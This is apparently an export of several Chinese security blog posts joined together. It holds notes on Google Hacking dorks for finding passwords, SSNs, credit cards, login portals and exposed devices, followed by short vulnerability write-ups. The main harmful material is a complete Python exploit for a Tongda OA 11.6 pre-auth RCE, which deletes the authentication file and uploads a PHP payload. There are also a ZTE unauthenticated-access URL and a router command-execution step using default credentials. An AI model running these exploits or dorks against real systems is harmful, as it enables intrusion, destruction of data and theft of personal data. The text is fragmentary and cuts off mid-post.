扩展搜索关键字是人类的天性，自动化搜索真正的本领就在于它能思考人类工作过程并且能够将改过程翻译成某种算法 （对于自动化查找则和字典相同去匹配各种邮箱来找到你所使用的东西） E-mail地址 电话号码 人 获取大量结果 更多组合 使用“特殊的”操作符 eg： filetype:ppt site:www.****.gov filetype:doc site:www.****.gov filetype:xls site:www.****.gov filetype:pdf site:www.****.gov 5.2.3 从数据源获取数据 1.自行抓取——请求并接受响应 这是获取结果的另一种灵活的方式。你完全可以控制整个过程，并且可以进行诸如设置结果数量这类工作——使用应用编程接口（Applocation Programming Interface, API）你一旦进行了该工作，你的顾虑就被完全打消了，并且会开始着手调节参数 NETCAT 人们称Netcat是TCP/Internet Protocol (IP)的瑞士军刀。对于黑白两道而言，它都是一个极有的工具；从漏洞利用获取反解的shell（黑帽）到帮助网络管理员分析协议（白帽）。 2. 自行抓取——解析结果 可以用netcat抓取结果并自动做结果解析 3.Dapper Dapper站点（www.dapper.net）支持用户创建一种他们称为Dapper的东西。这些Dapp是很小的程序，可以从任何站点抓取信息，并将这些抓取的数据以几乎任何一种方式传递 （例如，XML、CSV、RSS等） 4.Aura/EvilAPI 一种能拦截Google API调用并返回简单对象存取协议（Simple Object Access Protocol, SOAP） XML的应用程序——基于仍旧在使用的API的应用程序不需要进行任何改动。 5.使用其他搜索引擎 除了Google外，世界上还有很多搜索引擎！MSN引擎也支持API API：API就是操作系统留给应用程序的一个调用接口，应用程序通过调用操作系统的 API 而使操作系统去执行应用程序的命令（动作）。 5.2.4解析数据 解析E-mail地址 域和子域 电话号码 5.2.5 后期处理 按相关性对结果进行分类 非摘要内容 呈现结果 5.3 搜索关键字 5.3.1 在Web上收集 你可以从中搜索到其他人的搜索关键字的泄露站点会突然出现，一旦你找到了一些有趣的东西，你将会看到此人执行的所有的其他的搜索 5.3.2 自行收集 当你搜索某些资料时，查询都会定位到Google计算机。你每次在Google上执行搜索时，他们都会查看你是否通过了一个cookie。如果没有会指示你的浏览器设置一个 // 然后可以使用burfsuite去搞一些事情 隐藏 甜言蜜语： 假设你在运行一个代号为“Sookha”的超级机密项目。没有人知道这个项目的名称。如果某人想去Google上查找单词Sookha，那么你应该在不让搜索者察觉你所了解的事实情况下获知。你能做的就是注册一个使用Sookha作为关键字的关键字广告。 5.4一些感想 应该建立一个自己的字典脚本来对于一些查询 学习一些python脚本来为你的自动搜索做一些事情 对于一个隐晦的不想让他人通过Google在搜索出来的东西可以以该名字作为一个广告的关键字 第六章 搜索漏洞利用与查找目标 6.1 简介 漏洞利用（exploit）代码时黑客使用的一种工具。他们设计用来洞察一个目标，大部分黑客都有许多可以随意支配的漏洞利用。而大部分的漏洞利用在某段时间内时不公开的，不过他们最终会公布，发布出来，而我们正式利用这一点来进行Google搜索 找到一些可以使用的和一些可以被攻击的目标 6.2搜索漏洞利用代码 可以通过关注那些常见的字符串，例如exploit或者vulnerablility，来搜索公开的漏洞利用站点。如果想让结果更为精确，可以给查询附上filetype操作符，以查询以特定程序设计语言所编写的漏洞利用 eg: filetype:c c | filetype:c exploit | php 即可以使用filetype指定文件扩展名，也可以使用源代码中的常见字符串，例如“include ”，来查找漏洞利用代码 ​ ​ 6.3 Google代码搜索 Google代码搜索，可以用来搜索程序内部的代码，但是它也可以用来搜索导致漏洞的编程错误 除了允许查询包括强大的正则表达式外，代码搜索还引入了特殊的搜索符，如下 ​ ​ 6.4 搜索恶意软件和可执行文件 Google不止会抓取，还会分析二进制文件或者可执行文件 Google的二进制搜索功能可以用来剖析可执行文件，但是它也可以用来搜索Web上的可用恶意软件 6.5 搜索易受攻击的目标 攻击者可以利用软件制造商提供的应用程序的演示程序中出现的字符串来搜索潜在的目标 攻击者也可以下载并选择性安装易受攻击的产品，从而在应用程序显示的字符串中查找特殊的字符串 不管字符串是如何获得的，它都能够很容易地转换成Google查询，彻底缩短了在公开漏洞公告之后，访问人员花在加固站点安全上的时间 6.5.1 利用演示页面搜索目标 通过演示页面来获取web对应的一些版本信息在来进行查询 6.5.2 利用源代码搜索目标 同样的原来在网页上下载对应的网站源代码来找到网站的信息，针对各种信息在做出对应的查询 6.5.3 利用CGI扫描搜索目标 利用CGI扫描器 一个CGI扫描器可以在一个数据文件中列出易受攻击的文件和目录 eg： inurl:/cgi-bin/userreg.cgi | filetype:cgi inurl:userreg.cgi ​ 6.6 网站链接 www.sensepost.com/research/wikto/ Wikto,一个很棒的Google和web扫描器 www.cirt.net/code/nikto.shtml Nikto, 一很棒的Web扫描器 http://packetstormsecurity.com 一个很棒的工具和漏洞利用站点 6.10 一些想法 这是因为它能够使用strip=1参数来显示缓存页面 第7章 简单有效的安全性搜索 7.1 简介 针对安全方面的工作而言，我们来看看在安全性评估中相当有效的10个搜索，但这仅仅是作为你的前10位列表的基础。 7.1.1 site site操作符擅长从Google所收集的内容中提取与目标有关的信息 这个操作符常用于和其他本章中提到的查询组合使用，以对某一目标实现精确搜索 site搜索也可以用来收集关于目标主机或服务器的信息 eg： site:nytimes.com-site:**www.nytimes.com** 7.1.2 intitle:index.of 针对Apache风格的目录列表的通用搜索 目录列表能够给攻击者提供又价值的信息 7.1.3 error | warning (“for more information” | “not found”) (error | warning) 查询就返回了很多条有趣的结果 错误消息在每种坏境下都会泄露出很多信息 在某些情况下，警告文本能够提供目标所使用的代码内部的重要信息 7.1.4 login | logon 登陆 (login) 入口就是一个网站的”前门” 可以查询出来 这个查询可以高效地搜索出登陆人口 它也可以用来获取用户名以及解决问题的步骤 7.1.5 username | userid | employee.ID | “your username is” 有许多不同的方法用来从一个目标系统中获取用户名，即使在大多数的认证机制中，用户名都是不太重要的一半，但是至少应对它进行最低限度的保护，以防止外人获取 一种获取用户名的最通用的搜索 当这个查询不能获取用户名时，其周围的上下文也能泄露攻击者可以用于后续攻击行为的信息 7.1.6 passworl | passcode | “your passcode is” 这个查询反映了password的常见的方法 这个查询能够泄露描述登陆步骤、口令修改步骤以及目标所用的口令策略的文档。对于搜索有关电话会议的信息而言，特别是在Google日历搜索中，passcode特别有用 一般性的搜索是没有什么用的但是如果加上site搜索就变得不寻常了 7.1.7 admin | administrator 该查询用两个最常用的术语来表示网站的所有者或者维护者，可以用来暴露程序上的信息(例如”contact your administrator”)，甚至是管理登陆入口 7.1.8 -ext”:html -ext:html -ext:shtml -ext:asp -ext:php 当把这个查询和site操作符组合使用时，能够剔除最常见的文件，而暴露更有趣的文档 该查询也可以针对不同的目标而作相应的修改以剔除其他的常见文件累心 7.1.9 inurl:temp | inurl:tmp | inurl:backup | inurl:bak 查询也可以针对不同的目标而作相应的修改以剔除其他的常见文件，而暴露出更有趣的文档 7.1.10 intranet | help.desk 这个查询用来搜索内部网络站点（这些站点应该收到保护以防止外部人员访问）以及服务台联系信息和操作步骤 7.2 一些想法 规模较大的查询列表中的大多数搜索都是非常特殊的，它们只针对很少的一部分互联网站点。虽然这些特殊查询的效果极佳，但是一般最好还是保存一个规模较小的强大的搜索列表，以在评估中灵活地创造出丰富的搜索，尤其是当你用常规方法感到无计可施时更为有用 第8章 跟踪搜索Web服务器、登陆入口和网络硬件 8.1 简介 通常认为，渗透测试人员也是专业的黑客，因为它们本质上通过攻入客户的网路来查找、记录并且最终帮助客户解决系统或者网络中的安全缺陷的 8.2 定位并分析Web服务器 目录列表和默认的服务器生产的错误消息可以提供一些关于服务器的信息。即使这些信息可以通过直接连接到服务器来得到，但是一名拥有针对特定版本的软件的漏洞利用程序的攻击者会使用Google查询来搜索相应的目标，而这些Google查询都是针对这类信息设计的 攻击者尤其会关注操作系统，Web服务器软件的版本和名称、默认的配置，有漏洞的脚本，或者这些因素的任意组合 Google查询更为隐蔽而且也给攻击者和目标之前提供了某种程度的隔离 服务器和应用程序错误消息暴露了大量的信息，从软件的版本和补丁级别到源代码片段以及关于系统进程和程序的信息，错误消息是最被低估的信息泄露途径之一 8.2.1 目录列表 对与服务器的目录列表的程序“server at “Apache/2.0.52” ” 查找具有Apache 2.0.52 server标记的目录列表的服务器 8.2.2 Web服务器软件的错误信息 对于Microsoft IIS 默认情况下在IIS 5和IIS 6在服务器遇到某种问题时，会显示相应的静态的HTTP/1.1错误消息，这些错误页面默认保存在%SYSTEMROOT%\\help\\iishelp\\common目录 对于服务器报错，搜一些错误信息 httpd.conf bottom.html 可以使用一些基本的shell命令，我们就能吧错误页面的标题与可能出现在错误页面上的文本分离出来 //grep -h -r “Content-language: en” -A 10 | grep -A5 “TITLE” | grep -v virtual 8.2.3 应用软件错误消息 查询”Fatal error: Call to undefined function” -reply -the -next 能查找到ASP错误消息 查询 intext: “warning: Failed opening “ include_path 可以找到一些常见的错误，许多错误都会泄露路径名和文件名 8.2.4 默认页面 查找特殊类型的服务器或者Web软件的方法时搜索默认的Web页面。大多数的软件，包括Web服务器软件自身，都带有一个或多个默认或测试页面。这些页面可以让管理员方便地测试Web服务器或者应用程序的安装。 一些查找特定服务器的查询 ​ ​ ​ ​ 8.2.5 默认文档 Web服务器软件通常会附带一些手册和文档，它们位于Web目录中。攻击者可以利用这种文档对Web软件进行剖析或者搜索。 大部分一些文档会透露着一些服务器什么的默认设置甚至一些管理员的默认账户密码 ​ 8.2.6 示例程序 Web软件除了附带文档和手册之外，一个软件包通常还包含一些默认的应用程序。这些默认的应用程序，例如默认的Web页面，可以帮助演示软件的功能，作为开发者的起点，提供可以用作学习工具的实例函数和代码。 例如Microsoft Index Server的内容查找可以允许Web访问者搜索整个网站的内容。在某些情况下，这个查询页面能够查找到没有被其他任何页面链接的页面或者包含敏感信息的页面 ​ 你可以使用这些缓存页面与&amp;strip=1选项一道来匿名查看页面，这可以让信息收集工作远离服务器管理员的监视​ ​ 8.3 定位登陆入口 登陆入口会吸引那些正搜索特定类型软件的攻击者。另外，登陆入口也可以作为信息收集攻击的起点。因为大多数登陆入口都是设计成对用户友好的，给新用户提供帮助文档和操作步骤的链接。管理登陆入口和远程股管理工具有时更加危险，尤其是当它们没有被正确的配置时 一些登陆入口，类似allinurl:” exchange/logon.asp” 可能会提供大量关于服务器的信息 ​ ​ ​ ​ ​ ​ ​ 使用并且查找各种Web工具 虽然Google强大且灵活，但它并不是无所不能的。有时候，如果不用Google反而更简单。当不使用Google来执行类似与WHOIS查询，“pings”，traceroute以及端口扫描等任务时，更为简单方便。 NQT网络查询工具（Network Query Tool）。http://www.shipmail.gr/index.php ​ 默认的NQT安装允许任何网络用户执行IP主机名和地址查询，DNS查询，WHOIS查询，端口测试与traceroute。NQT是一个基于Web的程序，意思是说任何能够访问该页面的用户都可以对任意目标执行这些功能。器服务器会掩盖用户的真实地址。如果使用一个匿名代理服务器，则可以进一步的隐藏用户的真实身份 //NQT程序也打接受远程的POST请求 8.4 瞄准使用Web的网络设备 各种网络设备都可以用Google查询搜索到。对某些攻击者而言，这些设备不仅知识满足他们技术上的好奇，许多由Web链接了的设备配置不当，而且安全审计人员通常会忽视那些可信的设备。网络摄像头就是一种被忽视的设备，它能够给攻击者提供目标的内部情况，即使只有相当少的一部分目标安装了网络摄像头。当网络打印机被攻陷时，会泄露大量的敏感信息，尤其是对攻击者而言，他们可以查看打印作业和网络信息。 许多网络设备都预安装一个Web接口以雨荨管理员查询设备的状态或者通过Web浏览器来改变设备的设置 8.5 查找各种网络报告 网络文档和状态报告，它们能够让外部人员访问所有的信息，从网络上的IP地址到完整的，可用的网络图表 来自这些信息可以用来帮助创建网络映射 8.6 查找网络硬件 一个连接到网络的设备通常都具有某种Web页面。如果该设备连接到了互联网上，斌且曾经在一个到该设备的Web页面的链接，那么很有可能该页面存在于Google的数据库之中，等待某个灵巧的查询找到它 ​ 8.7 总结即一些感想 攻击者使用Google由多种目的。攻击者可能拥有一个针对某个Web软件特定版本的漏洞利用程序 目录列表可以提供设备上所用的软件版本信息。 服务器报错也会泄露大量的信息 登陆入口也是攻击的一个手段 总的来说还是一个固定不变的思想有输入就有攻击，你有反应我就可以作事情，查询一些以有的东西来帮助我做一些事情 第九章 用户名、口令和其他秘密信息 9.1 简介 这一章的内容不是关于在评估过程中查找敏感数据的，而是关于为了搜索这些数据，那些“坏人”可能会做什么。这一章所提到的例子通常都代表了最常见的安全问题。黑客在每次攻击时都要瞄准这些信息。为了对抗这类攻击者。我们必须十分明确这种攻击会造成的最坏的可能。但是，我们也不用过于了解这些最坏的可能。请不要告诉那些有坏信息的人一些他们尚不知道的观念 9.2搜索用户名 大多数认证系统都是使用用户名和口令来保护信息。为了达到突破这类保护的“前门”的目的，你需要判断用户以及口令。 能够在许多地方找到用户名，某些时候，可能需要挖掘文档或E-mail目录 一个想“your username is” 这样简单的查询都能有效地搜索用户名 在一些帮助文档中包括了一些默认的用户和密码 ​ 搜索已知的文件名来查找是否存在信息 在Windows注册表保存了各种认证信息，包括用户名和口令，虽然不可能（很少）在Web中搜索到可用的，导出了的Windows注册表文件，但是这都是一种思想 可以在公共目录中查找多次，最终会得到接近于包含所有用户信息的列表 9.3搜索口令 口令数据是渗透测试中的“圣杯”之一，它应该收到保护。遗憾的是。有许多可以用来在网络上搜索口令查询Google查询的例子 一个类似于“Your password” forgot这样简单的查询能够找到提供忘记口令回复机制的页面 intext:(password | passcod | pass) intext:(username | userid | user)是另外一种针对口令信息的通用搜索 ​ 下面是各种语言password的翻译文 ​ 9.4 搜索信用卡账号和社保号码等 随着互联网上不可靠的零售商越来越多，出现如此多的信用卡欺骗现象也就没有什么可奇怪的了。并不是只有这些小规模的零售商会受到黑客的攻击。这些年来，成败上千个大新企业的财务数据库也受到了攻击，有些受害公司还是技术比较好并且也非常主义防止攻击的公司 大多书情况下，包含这些账号的页面都不是从在线零售商或者电子商务网站”泄露出去的“，而很有可能是网络钓鱼欺骗结果。网络钓鱼欺骗是通过电话或者E-mail欺骗用户的个人信息 甚至一些不负责任的新闻渠道泄漏了能够查找这些信息的功能查询，还可以通过搜索特定的文件扩展名来查找 9.4.1 社保账号 社保号码和其他铭感数据也可以很容易地通过Google查找到，所用的技术和搜索信用卡账号的技术相同 9.4.2 个人财务数据 在某些情况下，公布个人消息的责任在于钓鱼欺骗，在其他一些情况下，侵犯个人隐私就要归咎于那写攻击网上零售商的黑客了。随这当今社会个人电脑数量的快速增长，差不多有上百种个人财务程序供用户选择使用。许多这种程序都会创建带有特定文件扩展名的数据文件 ​ 9.5搜索其他有利可图的信息 Google能找到的但是很难归类的数据。这些数据包括地址簿、聊天日志文件、以及网络漏洞报告等，这些网上的敏感数据都是很有价值的。 ​ Nessus安全扫描工具的输出。Nessus可以在www.nessus.org上获得。这个很棒的开源工具能够对目标执行一系列的安全测试，并报告各种可能的漏洞 9.6 总结 不要犯任何错误，因为在网上存在各种敏感的数据，而且Google能够找到这些数据。除非你能够给出恰当的查询，否则可搜索的信息机会没有任何限制。用户名、口令、信用卡账号、社保号码和个人财务数据这些信息都在可搜索的范围内。 一个泄露的口令就能够提供关于用于其他系统上的口令的线索。大多数策略都进制这种口令共享，但是这种限制通常很难执行 第十章 hacking Google 服务 10.1 AJAX Search API AJAX Search API是AJAX前端的主要的Google服务。该项服务有意取代旧的SOAP搜索服务，而SOAP搜索服务的支持在不久前已经被废止了。AJAX Search API被认为是比SOAP服务更强大的一个服务，并且更容易使用。 该服务的主要目标是使外部网能够寄存Google供给的技术，这些技术提供了位域寄存在Web站点内、外的搜索工具，并且可以是视频剪辑、地图、博客、自定义搜索引擎等等中的一个 10.1.1 嵌入式Google AJAX Search API Google AJAX Search API 设计为嵌入到外部页内。这使得服务箱单更有用，因为我们可以指导自定义界面来获得更好的对Google底层结构的访问。为了着手启用Google AJAX Search API 你需要理解JavaScrippt和AJAX编程以及你要自行生成的API密钥。 XSS和AJAX蠕虫 该技术可以通过XSS/AJAX蠕虫来实现目标搜索并且利用目标来获取有用的信息，因此要确保将来的繁殖。XSS/AJAX蠕虫通常都在源域中繁殖和传播。这是因为JavaScript没有执行跨站点请求的能力。本章提到的该技术语序蠕虫绕过JacaScript的限制，并且可以访问在线的其他资源 10.2 Calendar Google calendar 是一个功能强大的日历管理应用程序，它支持类似日历共享、邀请创建、搜索以及日历发布。该服务也可以于Google Mail （Gmail）结合起来，并且可以通过移动设备来访问。 因为单个用户可以维护其他用户可能更也很感兴趣的时间列表以及入理。所以calendar共享是一个非常有用的功能。 共享的日历，通常。甚至是执行那些最基本的搜索时，都完全有可能无意间发现那些可以执行恶意目的的铭感信息 例如泄露了几个预定的电话会议。注意，会议电话号码和访问代码也列了出来，你可通过对于会议的秘密听取来获得你想要的信息，或者用一些简单的账户密码的搜索来找到一些你想要的信息 10.3 Blogger和Google的Blog Search Blogger时Google的博客软件，它位于blogger。com和blogspot。com之上。Blogger是使用得最广泛的博客之一。他允许多个博客实时创建，并且具有一些与其他软件合作并且避免注释和引用垃圾博客的功能 Splog的搜索引擎的排名在不断地提升，所以他会吸引更多的访问者。如果攻击者拿下了Web浏览器的Splog页面上的漏洞应用的话，他就应该在瞬间接管上百台机器 10.4 信号报警 google alerts是一个强大的工具，可以用来发觉查询结果合适变化。该系统可以被修改为每天或者每周都发送更新，亦或者是有更新时发送更新 这是一个很出色的工具，它还可以用于更有趣的目的。假设、我们知道目标服务器使用Mysql作为数据库终端。我们可以使用Google Alerts 来查询目标，并且在出现错误时搜索错误信息 为警报类型选择Web—通常这是默认的选项。选项警报的频率以及你的E-mail地址并且单击Create Alert（创建警报） 恶意用户可以使用该服务来警示目标站点上出现的漏洞和有趣信息。这个警示的配置非常低，并不会让目标有所警惕，该业务发生在用户和Google之间。攻击者甚至可以碰到Google Hacking Database中所有条目的警报。 10.5 Google Co-op Google Co-op（www.google.com/coop）是一个非常强大的服务，允许你创建一个强大的自定义搜索引擎。你不需要为了使用该服务而注册为Google用户，但是如果你需要创建一个引擎，则需要注册 10.6 Google Code Google Code是对允许提供全免费项目的开源代码社区的最大的恩惠。在功能方面，该服务与很多人都知道的Sourceforge十分相似。通过SVN，为研发者提供了Wiki来寄存项目文档、Bug跟踪体系以及版本控制 Google Code不只是一个开发环境，他还是一个免费的寄存提供者。我们可以使用该系统来隐藏此处的所有信息 10.6.1 SVN简介 10.6.2 在线获取文件 一旦你的项目提交到源库中，你便可以在线访问它的内容。你可以通过访问http://projectname.googlecode.com/svn/trunk来获取提交的项目。记住，提交的文件可以作为内容形式的文件/明码或者内容形式的应用程序/八位字节流使用，这样一来便可以防止它们在浏览器中被解析。这意味着，理论上，你应该能查看/预览上传的图片或者HTML文件 尽管这样，攻击者扔旧可以寄存恶意脚本，该脚本可以利用带有漏洞的浏览器，允许系统控制访问者的浏览器。这正是我们着手查看Google Code开发平台真正潜力的入口。没有任何东西可以防止攻击者在线寄存他们的恶意文件，防止攻击者使用它们来攻击无辜的人。因为ISP（互联网服务提供商）不能完全地组织Google来停止恶意传播，所以这种情况很值得关注。很多用户的处境都不容乐观 哪些熟悉IDS（侵入检测系统）和IPS（侵入预防系统）的人之所以会反对是因为恶意软件也可以通过将签名设置为可以在流行防火墙产品以及诸如Snort之类的开发源项目中找到的签名来查找。因为Google Code的加密选项，在绝大多数时间，攻击者都不会被察觉。正如我们知道的，加密通信能确保隐私的安全。Google为寄存的项目提供了SSL连接 10.6.3 查找代码 我们还可以用Google Code来查询代码，用一些正则表达式来精确的搜索一些我们想要的阿东西 例如查找SQL注入漏洞： mysql_query.*?_GET lang:php 该查询以关键字mysql_query开头——mysql_query是PHP里的标准函数。接着，我们使用.*?序列查找未定义的字符数。最后，在查找HTTP GET参数的关键字_GET。通常，我们查找的SQL查询由$_GET控制。对基于$_POST的SQL注入攻击应用也可以采用相似的策略。记住，本章的实例仅是我们可以进行测试的实例的一小部分变体。Google Code Search是一个非常有用的可以在很多语种中查找漏洞的工具 10.7 一些想法 我们可以使用Google Code Search在我们自己的项目中查找字符串。如果我们有一个巨大的数据集要分析，我们可以简单地将它上传到代码中，并且等待Google机器人程序将它找出来。接着，我们可以使用标准的正则表达式查询来查找我们最感兴趣的数据 对于一些工具我们可以根据他的源码和一些反应来自己创立一个属于自己的工具来做一些自己想做的事情 第十一章 Google Hacking案例 11.1 简介 Google 黑客会花上好几个小时在互联网上查找丰富的资源。通过一轮又一轮的搜索，他们会因找到清晰易读的，有意义的的搜索而欣喜若狂。之所以我了解这些是因为我亲眼目睹了这一过程。具有创造力的Google搜索可以泄露医药、金融、所有权甚至是机密信息。尽管政府颁布了法令、规章及保护法案，诸如HIPPA，且不断设置安全装置，这一问题仍然存在。信息仍会驱使网络中这一问题的发生，而这正好被Google黑客逮个正着 11.2 低级信息 我们将要一同来看一下由Google黑客揭秘的一些更有趣的技术。我们将从查看多种确实无关的、除非你的目标是帮助黑客的工具着手进行。接着，我们将要查看开放的网络设备，并且打开应用程序，它们都不涉及任何真正的可以使用的攻击 11.2.1 工具 任何黑客都有一个由他自行支配的工具基金，但是本节奏要探讨的该工具的有趣部分是：它们是在线的——它们在网络服务器上运行，且允许黑客有效地试探对该网络服务器的搜索。 与ping工具不同，finger工具已经很久没有投入使用了。这一烦人的服务允许攻击者查询UNIX机器上的用户，允许枚举各种信息，如用户连接时间、起始目录、全名以及其他的信息 11.2.2 开放的网络设备 对于所有在网络上开放和管理的网络设备你都可以去了解和控制 例如比较多的像摄像头，饮水机，打印机，自能手表等多种设备 11.2.3 开放的应用程序 相对而言，很多主流的Web应用程序都是傻子认证，它们是专门为那些对安全了解甚少而只懂点击操作的大部分人设计的。更重要的是Google攻击社区已经发现了成千上万个开放的在线应用程序，只需等待一个点击操作的脚本的出现并拥有它们即可 通常可以简单的去发现和控制一些网站甚至是一些服务器 11.3 摄像头 曾有一段时间，GHDB的所有附件就只有网络摄像头查询。尽管如此，有些网络摄像头查询。尽管如此，有些网络摄像头搜索还是十分有趣的。 11.4 电话设备 有些网络设备映射的网络暴露的大量的电话信息 有的管理系统甚至语序网络访问这连接会议电话、断开会议电话连接及监控会议电话，为与会者抓取快照，甚至是更改line(线路设置)，恶意的黑客甚至会更改系统名和密码，锁定合法管理者使其无法进入自己的系统 11.5 电源 当谈及使用Google攻击电源时，很多人都会感到怀疑。大多数人肯定在想是说UPS系统，对于网络上的一些有网络管理页面的系统来说都可以解决掉 11.6 敏感信息 敏感信息对于一些日志，文档，警务信息等都会泄露出大量的信息 11.7 社保号码 社保号码（SSN）是美国公民拥有的最敏感的信息。即使一个外行的罪犯也可以使用一个被到的SSN来开设一个银行账号，设置信用卡的最高限额以及其他的信息，所有均是以受害人的名义进行的。 对于一些Google泄露的信息来说大部分是攻击者从钓鱼网站上得来的 11.8 Google之外的信息 在某些情况下，Google都是长长的攻击链中的第一步。通过别的一些信息来获取到一些敏感的信息 11.9 总结 本章的所有内容都是关于Google攻击威胁被忽略后可能导致的严重错误。不论你何时身处严重的威胁都可以参看本章内容。请帮助传播这一信息，并且成为解决方案的一本而非问题的一本分。在想Google发送暂停或终止文件之前，记住——如果你的敏感数据使它成为在线内容，那么就不是Google的错了 第十二章 防卫Google黑客 12.1 简介 这本书的目的是在于帮助你理解Google黑客在攻击时可能采取的手段，这样你就能合理地保护自己和你的客户免于遭受这种似乎没有危险的威胁的侵害 12.2 完善且坚固的安全策略 应该把强制执行的，坚固的安全策略作为所有安全保障措施的基础 如果没有策略，那么你的安全防卫可能就会无效或者无法强制执行 12.3 Web服务器安全防护 目录列表、错误消息和不当的配置能提供大量信息 Robots.txt文件和特殊的META标记可以阻止搜索引擎Crawler访问特定的页面或目录 即使时最基本的口令机制都能阻止crawler访问受保护的内容 默认的页面和设置表明该服务器没有很好地维护而且会让该服务器成为黑客的一个目标 12.4 攻击你的站点 使用site操作符来浏览你负责保护的服务器，警惕任何不属于公开信息的页面 使用想Gooscan、Athena、GSI、Google Rower或者Advanced Dork这样的工具来评估你的网站的信息泄露情况。这些工具不使用Google API，所以要知道任何滥用或者过分的行为都会导致Google封掉你的IP段 使用像Wikto这样的工具也能攻击你的站点，而且这些工具使用了Google API，不会担心会被Google惩罚 利用Google hacking DATabase来跟踪最新的Google hacking查询。把GHDB和Gooscan、Athena或者Wikto这样的工具结合起来使用 12.5 从Google获取帮助 使用Google的Webmaster页面获取特殊的信息 使用Google的URL删除工具从Google数据库中删除敏感的数据 12.6 网站链接 http://johnny.ihackstuff.com （GHDB），搜索引擎hacking论坛，Gooscan工具和GHDB导出文件的主页 www.snakeoillabs.com Athena的主页 http://www.seorank.com/robots-tutorial.htm 使用robots.txt文件的优秀指南 www.sensepost.com/research/aura Sensepost的AURA,它可以模拟Google的SOAP API调用 http://www.tankedgenius.com JeffBall的Cp的GSI以及Google Rower工具的主页 https://addons.mozilla.org/en-US/firfox/addon/2144 Cp的Advanced Dork的主页","link":"/2018/03/23/WEB/Google-hacking/"},{"title":"通达OA11.6 preAuth RCE分析","text":"该漏洞需要结合任意文件删除以及文件上传漏洞进行配合 任意文件删除漏洞首先漏洞是在/module/appbuilder/assets/print.php img能将传入的guid传入的文件删除 身份绕过删文件某些时候可以删除一些认证的文件，进行文件的绕过 img 这里呢，简单来讲就是把auth.inc.php给包含进来，如果没有对应session的话，auth.inc.php就会作为“拦路虎”，让用户去登陆，但是删掉会怎么样？ 这里就要看php里面include和require的区别了 这两个东西看起来很相似,都是包含嘛，但是稍稍学过洋文的都知道，include的意思指的是包含，而require却有要求的意思，在这里就可以看出点区别了。 如果要包含的文件找不着，include就索性跳过去了，而require是要求，感觉更加强烈一些，找不着文件就fatal error停止不前了。 而恰巧通达OA里面用的都是include，于是如果发现auth.inc.php失踪了，就会直接跳过去! 因此我们只需要利用前面的漏洞，删掉auth.inc.php，即可跳过通达OA里面大部分身份验证！ 其中的代码验证SESSION判断是否登录 变量覆盖和任意文件上传这里我们看到general/data_center/utils/upload.php 这前面包含的header.inc.php会将$_REQUEST中的所有东西注册成变量 （没找到大佬说的位置） 可以尝试使用变量覆盖 漏洞点在图中最后一个else $repkid可控，然后传参数时加入../../../跳到别的目录（因为通达OA的nginx配置中，上传文件所在的attachment目录里面的PHP不准访问，因此必须要跳出去） POC如下： 1本POC不是无损利用的，会让对方系统文件被删除导致无法正常工作并且由于目标系统及网络环境不可控，该漏洞也不可能编写出在任何情况下都完全无损的EXP使用时请一定一定要慎重，一定要获取对方书面授权再使用如果仅仅想要检测漏洞的存在性，可以自己编写脚本只检测/module/appbuilder/assets/print.php是否存在 import requeststarget=&quot;http://127.0.0.1:8203/&quot;payload=&quot;&lt;?php echo 123456 ?&gt;&quot;print(&quot;[*]Warning,This exploit code will DELETE auth.inc.php which may damage the OA&quot;)input(&quot;Press enter to continue&quot;)print(&quot;[*]Deleting auth.inc.php....&quot;) url=target+&quot;/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php&quot;requests.get(url=url)print(&quot;[*]Checking if file deleted...&quot;)url=target+&quot;/inc/auth.inc.php&quot;page=requests.get(url=url).textif 'No input file specified.' not in page: print(&quot;[-]Failed to deleted auth.inc.php&quot;) exit(-1)print(&quot;[+]Successfully deleted auth.inc.php!&quot;)print(&quot;[*]Uploading payload...&quot;)url=target+&quot;/general/data_center/utils/upload.php?action=upload&amp;filetype=nmsl&amp;repkid=/.&lt;&gt;./.&lt;&gt;./.&lt;&gt;./&quot;files = {'FILE1': ('hack.php', payload)}requests.post(url=url,files=files)url=target+&quot;/_hack.php&quot;page=requests.get(url=url).textif 'No input file specified.' not in page: print(&quot;[+]Filed Uploaded Successfully&quot;) print(&quot;[+]URL:&quot;,url)else: print(&quot;[-]Failed to upload file&quot;)","link":"/2020/09/13/WEB/Exploit/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA11-6-preAuth-RCE%E5%88%86%E6%9E%90/"},{"title":"(CVE-2020-6871)ZTE R5300G4、R8500G4和R5500G4 未授权访问漏洞","text":"一、漏洞简介ZTE R5300G4、R8500G4和R5500G4中的服务器管理软件模块存在安全漏洞。攻击者可利用该漏洞绕过服务器的身份验证并执行命令。 二、漏洞影响ZTE R5300G4 V03.08.0100版本，V03.07.0300版本，V03.07.0200版本，V03.07.0108版本，V03.07.0100版本，V03.05.0047版本，V03.05.0046版本，V03.05.0045版本，V03.05.0044版本，V03.05.0043版本，V03.05.0040版本，V03.04.0020版本；R8500G4 V03.07.0103版本，V03.07.0101版本，V03.06.0100版本，V03.05.0400版本，V03.05.0020；R5500G4 V03.08.0100版本，V03.07.0200版本，V03.07.0100版本，V03.06.0100版本。 复现过程 未登录状态下直接访问 1https://xxx.com/Java/jviewer.jnlp?EXTRNIP=设备BMC管理口ip&amp;JNLPSTR=JViewer","link":"/2020/09/12/IOT/Exploit/ZTE/CVE-2020-6871-ZTE-R5300G4%E3%80%81R8500G4%E5%92%8CR5500G4-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"title":"JCG路由器命令执行漏洞","text":"JCG路由器命令执行漏洞 漏洞复现在shadan上搜索相关信息 JHR-N835R 选择其中一个进行测试 http://216.171.4.173/home.asp 默认密码：admin/admin 在系统工具中可执行命令","link":"/2020/09/12/IOT/Exploit/JCG/JCG%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"title":"DMA攻击和Thunderbolt 3安全级别浅谈","text":"0x00 DMA攻击 ​ DMA攻击是一种侧信道攻击，即攻击者可以通过利用高速扩展端口，穿透计算机和操作系统，直接读取DMA，DMA包含在许多连接中，DMA可以通过例如便携式摄像机、网卡、存储设备或者其他可直接读取或写入主内存的互动设备。此类设备的合法使用已导致DMA连接广泛，攻击者可以采用工具连接到DMA接口，绕过操作系统的安全机制和屏幕密码等，来访问部分或者全部的计算机物理内存地址，读取计算机的所有工作，窃取数据和加密密钥，安装运行间谍软件和其他漏洞利用程序，或者修改系统以允许后门或其他恶意软件 